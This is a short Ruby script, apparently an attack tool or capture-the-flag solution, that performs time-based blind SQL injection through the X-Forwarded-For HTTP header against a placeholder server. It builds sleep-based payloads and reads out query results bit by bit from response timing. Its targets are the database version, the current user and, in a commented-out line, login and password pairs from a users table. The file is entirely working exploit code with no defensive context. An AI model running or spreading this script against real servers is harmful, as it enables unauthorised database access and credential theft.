require 'socket'

inj = "select @@version"
#inj = "select user()"
#inj = "select concat(login,':',password) from users"
str = ""

def test(sql)
 p = "hacker' or if((#{sql}),sleep(0.5),0) and '1'='1"
 t = Time.now
 begin
  s = TCPSocket.new("<server_ip_addr>",80)
  s.write("GET / HTTP/1.1\r\nHost: <server_ip_addr>\r\nX-Forwarded-For: #{p}\r\nConnection: close\r\n\r\n")
  s.readlines()
  s.close
 rescue Errno::ECONNRESET,EOFError
 end
 return ((Time.now-t)>0.5)
end

index = 0

while index < 10
newinj = inj + " limit #{index},1"
i = 0
str = ""
value = 1

while value != 0
 i+=1
 value = 0
 0.upto(7) do |bit|
 sql = "select ascii(substring((#{newinj}),#{i},1))&#{2**bit}"
 if test(sql)
    value+=2**bit
 end
end
str+=value.chr
puts str
end

index+=1

end

